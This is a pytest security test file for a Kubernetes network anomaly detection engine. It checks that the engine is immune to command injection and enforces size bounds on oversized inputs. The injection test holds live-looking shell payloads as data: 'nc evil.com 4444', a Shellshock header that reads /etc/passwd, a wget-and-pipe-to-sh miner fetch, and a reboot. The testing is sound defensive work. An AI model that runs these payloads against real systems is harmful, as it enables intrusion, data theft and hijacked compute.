import os
import sys
import torch
import pytest

# Ensure Python can locate the engine modules in src/
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

import config
from symbolic_supervisor import SymbolicSupervisor
from stream_processor import HubbleStreamProcessor
from nlp_model import UrlNlpAutoencoder

# ==============================================================================
# TEST 1: COMMAND INJECTION IMMUNITY
# ==============================================================================
def test_engine_command_injection_in_network_payloads():
    """
    PROOFS: Command injection attempts inside HTTP URLs, headers, bodies, 
    and K8s app labels are treated strictly as literal string data. They are 
    mathematically tokenized and never trigger host shell execution.
    """
    supervisor = SymbolicSupervisor()
    processor = HubbleStreamProcessor()

    # Raw Hubble event with shell command injection payloads across all L7 fields
    malicious_hubble_event = {
        "node_name": config.NODE_NAME,  # <--- FIXED: Dynamically match the node config
        "flow": {
            "verdict": "FORWARDED",
            "source": {
                "labels": ["k8s:app=frontend-ui; $(touch /tmp/engine_pwned)"]
            },
            "destination": {"port": 80},
            "l7": {
                "type": "REQUEST",
                "http": {
                    "method": "POST; `reboot`",
                    "url": "/api/v1/export?id=1|nc evil.com 4444",
                    "headers": [
                        {"key": "User-Agent", "value": "() { :;}; echo vulnerable; /bin/bash -c 'cat /etc/passwd'"}
                    ],
                    "body": "{\"data\": \"$(wget http://malware.com/miner.sh -O- | sh)\"}"
                }
            }
        }
    }

    # 1. Process features through the Stream Processor
    features = processor.process_event(malicious_hubble_event)
    assert features is not None, "Stream processor crashed or incorrectly filtered the injected payload."
    assert features.shape == (13,), "Feature array dimensions were corrupted."

    # 2. Evaluate through Symbolic Supervisor
    decision = supervisor.evaluate(malicious_hubble_event)
    
    # Must evaluate as a structural method anomaly or Unknown—never executing the string
    assert decision in ["symbolic_anomalous_method_length", "Unknown"], f"Supervisor returned unexpected state: {decision}"

    # 3. Verification: Prove no subshell execution occurred on the host
    assert not os.path.exists("/tmp/engine_pwned"), "Command Injection Executed! File /tmp/engine_pwned was created by the Engine."


# ==============================================================================
# TEST 2: BUFFER OVERFLOW & TENSOR BOUNDARY IMMUNITY
# ==============================================================================
def test_engine_buffer_overflow_bounds():
    """
    PROOFS: Massive, unbounded HTTP URLs and bodies (>100,000 characters) are 
    safely intercepted by the Symbolic Supervisor, and tensor allocations are 
    strictly truncated to prevent PyTorch Out-Of-Memory (OOM) crashes.
    """
    supervisor = SymbolicSupervisor()
    
    # Initialize the NLP autoencoders with specific bounds
    brain_b = UrlNlpAutoencoder(vocab_size=128, seq_length=150)
    brain_c = UrlNlpAutoencoder(vocab_size=128, seq_length=512)

    # 1. Generate 100,000 character HTTP URL (Buffer Overflow attempt)
    overflow_url = "/api/v1/search?q=" + ("A" * 100000)
    
    overflow_event = {
        "flow": {
            "source": {"labels": ["k8s:app=attacker"]},
            "l7": {
                "type": "REQUEST",
                "http": {
                    "method": "GET",
                    "url": overflow_url,
                    "headers": [{"key": "Host", "value": "api.local"}],
                    "body": "B" * 100000
                }
            }
        }
    }

    # PROVE 1: Supervisor short-circuits the overflow immediately
    decision = supervisor.evaluate(overflow_event)
    assert decision == "symbolic_uri_too_large", "Supervisor failed to trap the buffer overflow!"

    # PROVE 2: Tensor Bound Enforcement for Brain B (URL)
    encoded_url = [min(ord(c), 127) for c in overflow_url][:150]
    padding = [0] * (150 - len(encoded_url))
    tensor_nlp = torch.LongTensor(encoded_url + padding).unsqueeze(0)

    # Tensor shape MUST be strictly bound to (1, 150) despite the 100k char input
    assert tensor_nlp.shape == (1, 150), f"Brain B Tensor unbounded! Shape: {tensor_nlp.shape}"
    
    # Execute forward pass on Brain B without memory allocation failure
    with torch.no_grad():
        logits_b = brain_b(tensor_nlp)
        assert logits_b.shape == (1, 150, 128), "Brain B forward pass failed on truncated tensor."

    # PROVE 3: Tensor Bound Enforcement for Brain C (Body)
    overflow_body = overflow_event["flow"]["l7"]["http"]["body"]
    encoded_body = [min(ord(c), 127) for c in overflow_body][:512]
    padding_body = [0] * (512 - len(encoded_body))
    tensor_nlp_body = torch.LongTensor(encoded_body + padding_body).unsqueeze(0)

    # Tensor shape MUST be strictly bound to (1, 512) despite the 100k char input
    assert tensor_nlp_body.shape == (1, 512), f"Brain C Tensor unbounded! Shape: {tensor_nlp_body.shape}"

    # Execute forward pass on Brain C without memory allocation failure
    with torch.no_grad():
        logits_c = brain_c(tensor_nlp_body)
        assert logits_c.shape == (1, 512, 128), "Brain C forward pass failed on truncated tensor."
